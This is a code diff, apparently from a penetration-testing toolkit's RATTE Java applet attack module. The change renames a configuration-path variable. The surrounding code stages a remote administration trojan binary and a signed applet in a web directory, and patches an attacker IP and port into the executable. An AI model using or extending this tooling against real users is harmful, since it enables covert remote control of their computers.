@@ -35,7 +35,7 @@ except NameError:
     pass
 
 definepath = os.getcwd()
-setdir = core.userconfigpath
+userconfigpath = core.userconfigpath
 
 MAIN = " RATTE Java Applet Attack (Remote Administration Tool Tommy Edition) - Read the readme/RATTE_README.txt first"
 
@@ -100,10 +100,10 @@ def java_applet_attack_tw(website, port, directory, ipaddr):
     ############################################
 
     # this part is needed to rename the msf.exe file to a randomly generated one
-    if os.path.isfile(os.path.join(setdir, "/rand_gen")):
+    if os.path.isfile(os.path.join(userconfigpath, "rand_gen")):
         # open the file
         # start a loop
-        with open(os.path.join(setdir, "rand_gen")) as fileopen:
+        with open(os.path.join(userconfigpath, "rand_gen")) as fileopen:
             for line in fileopen:
                 # define executable name and rename it
                 filename = line.rstrip()
@@ -111,7 +111,7 @@ def java_applet_attack_tw(website, port, directory, ipaddr):
                 subprocess.Popen("cp src/payloads/ratte/ratte.binary %s/%s 1> /dev/null 2> /dev/null" % (directory, filename), shell=True).wait()
 
     # lastly we need to copy over the signed applet
-    subprocess.Popen("cp %s/Signed_Update.jar %s 1> /dev/null 2> /dev/null" % (setdir, directory), shell=True).wait()
+    subprocess.Popen("cp %s/Signed_Update.jar %s 1> /dev/null 2> /dev/null" % (userconfigpath, directory), shell=True).wait()
 
     # TODO index.html parsen und IPADDR:Port ersetzen
     with open(os.path.join(directory, "index.html"), "rb") as fileopen:
@@ -148,7 +148,7 @@ def prepare_ratte(ipaddr, ratteport, persistent, customexe):
     ############
     # PATCH Server IP into RATTE
     ############
-    with open(os.path.join(setdir, "ratteM.exe"), 'wb') as filewrite:
+    with open(os.path.join(userconfigpath, "ratteM.exe"), 'wb') as filewrite:
 
         host = (len(ipaddr) + 1) * "X"
         r_port = (len(str(ratteport)) + 1) * "Y"
@@ -271,10 +271,10 @@ def main():
     core.print_info("Starting java applet attack...")
     java_applet_attack_tw(website, javaport, "reports/", ipaddr)
 
-    with open(os.path.join(setdir, definepath, "/rand_gen")) as fileopen:
+    with open(os.path.join(userconfigpath, definepath, "/rand_gen")) as fileopen:
         for line in fileopen:
             ratte_random = line.rstrip()
-        subprocess.Popen("cp %s/ratteM.exe %s/reports/%s" % (os.path.join(setdir, definepath), definepath, ratte_random), shell=True).wait()
+        subprocess.Popen("cp %s/ratteM.exe %s/reports/%s" % (os.path.join(userconfigpath, definepath), definepath, ratte_random), shell=True).wait()
 
     #######################
     # start ratteserver
